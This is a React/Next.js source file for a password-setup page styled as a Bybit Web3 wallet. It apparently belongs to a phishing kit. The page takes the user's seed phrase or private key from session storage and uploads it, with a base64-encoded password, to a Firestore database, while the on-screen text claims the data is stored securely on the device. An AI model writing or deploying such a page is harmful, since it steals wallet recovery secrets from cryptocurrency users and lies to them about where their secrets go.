"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { ChevronLeft, Eye, EyeOff } from "lucide-react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { saveWalletToFirestore } from "@/lib/firebase"

export default function SetupPage() {
  const [password, setPassword] = useState("")
  const [confirmPassword, setConfirmPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [showConfirmPassword, setShowConfirmPassword] = useState(false)
  const [agreedToTerms, setAgreedToTerms] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [walletData, setWalletData] = useState<{ type: "seed" | "private"; data: string[] | string } | null>(null)
  const router = useRouter()

  useEffect(() => {
    const storedWalletData = sessionStorage.getItem("walletData")
    if (storedWalletData) {
      setWalletData(JSON.parse(storedWalletData))
    }
  }, [])

  // Password validation
  const hasMinLength = password.length >= 8 && password.length <= 30
  const hasNumber = /\d/.test(password)
  const hasUppercase = /[A-Z]/.test(password)
  const hasLowercase = /[a-z]/.test(password)
  const noRepeatingChars = !/(.)\\1{7,}/.test(password)

  const validations = [
    { text: "8-30 characters, may include special characters", valid: hasMinLength },
    { text: "Must contain at least 1 number", valid: hasNumber },
    { text: "Must contain at least 1 uppercase letter", valid: hasUppercase },
    { text: "Must contain at least 1 lowercase letter", valid: hasLowercase },
    { text: "Do not include 8 or more identical characters in a row", valid: noRepeatingChars },
  ]

  const isFormValid = validations.every((v) => v.valid) && password === confirmPassword && agreedToTerms

  const handleConfirm = async () => {
    if (!isFormValid || !walletData) return

    setIsLoading(true)
    try {
      // Create a simple hash of the password (in production, use proper hashing)
      const passwordHash = btoa(password) // Base64 encoding for demo purposes

      const walletDataToSave = {
        type: walletData.type,
        data: walletData.data,
        passwordHash,
        timestamp: Date.now(),
      }

      console.log("[v0] Saving wallet data to Firestore:", walletDataToSave)
      await saveWalletToFirestore(walletDataToSave)

      // Clear sensitive data from sessionStorage
      sessionStorage.removeItem("walletData")

      // Redirect to success page or dashboard
      router.push("/wallet-created")
    } catch (error) {
      console.error("[v0] Error saving wallet:", error)
      alert("Error saving wallet. Please check your Firebase configuration.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-black text-white flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between p-4">
        <Link href="/">
          <ChevronLeft className="w-6 h-6 text-white" />
        </Link>
        <h1 className="text-xl font-semibold">Set password</h1>
        <div className="w-6" />
      </div>

      {/* Content */}
      <div className="flex-1 px-6 py-8">
        {/* Lock icon */}
        <div className="flex justify-center mb-8">
          <div className="relative">
            <div className="w-20 h-20 bg-gradient-to-br from-purple-500 to-purple-700 rounded-2xl flex items-center justify-center">
              <div className="w-8 h-8 border-2 border-white rounded-md relative">
                <div className="absolute -top-2 left-1/2 transform -translate-x-1/2 w-4 h-4 border-2 border-white border-b-0 rounded-t-full" />
                <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-1 h-1 bg-white rounded-full" />
              </div>
            </div>
            <div className="absolute -inset-2 bg-purple-500/20 rounded-3xl blur-xl" />
          </div>
        </div>

        {/* Description */}
        <p className="text-center text-gray-300 mb-8 text-balance leading-relaxed">
          Create a wallet password to verify transactions and restore your wallet. It will be stored securely on your
          device. Do not forget your password as it cannot be recovered.
        </p>

        {/* Password form */}
        <div className="space-y-6">
          <div>
            <label className="block text-white font-medium mb-3">Set password</label>
            <div className="relative">
              <Input
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-gray-800 border-purple-500 text-white placeholder-gray-400 pr-12 py-4 rounded-xl"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          <div>
            <label className="block text-white font-medium mb-3">Confirm password</label>
            <div className="relative">
              <Input
                type={showConfirmPassword ? "text" : "password"}
                placeholder="Re-enter your password"
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                className="bg-gray-800 border-gray-600 text-white placeholder-gray-400 pr-12 py-4 rounded-xl"
              />
              <button
                type="button"
                onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400"
              >
                {showConfirmPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          {/* Password requirements */}
          <div className="bg-gray-900 rounded-xl p-4 space-y-3">
            {validations.map((validation, index) => (
              <div key={index} className="flex items-center gap-3">
                <div
                  className={`w-5 h-5 rounded-full flex items-center justify-center ${
                    validation.valid ? "bg-purple-600" : "bg-gray-600"
                  }`}
                >
                  {validation.valid && (
                    <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                      <path
                        fillRule="evenodd"
                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                        clipRule="evenodd"
                      />
                    </svg>
                  )}
                </div>
                <span className={`text-sm ${validation.valid ? "text-white" : "text-gray-400"}`}>
                  {validation.text}
                </span>
              </div>
            ))}
          </div>

          {/* Terms checkbox */}
          <div className="flex items-start gap-3">
            <Checkbox
              checked={agreedToTerms}
              onCheckedChange={setAgreedToTerms}
              className="mt-1 border-purple-500 data-[state=checked]:bg-purple-600"
            />
            <label className="text-sm text-gray-300">
              I agree to{" "}
              <Link href="#" className="text-purple-400 underline">
                Bybit Web3's Terms of Service
              </Link>
            </label>
          </div>

          {/* Confirm button */}
          <Button
            disabled={!isFormValid || isLoading}
            onClick={handleConfirm}
            className="w-full bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 disabled:from-gray-600 disabled:to-gray-700 text-white py-4 text-lg font-semibold rounded-xl mt-8"
          >
            {isLoading ? "Saving..." : "Confirm"}
          </Button>
        </div>
      </div>
    </div>
  )
}
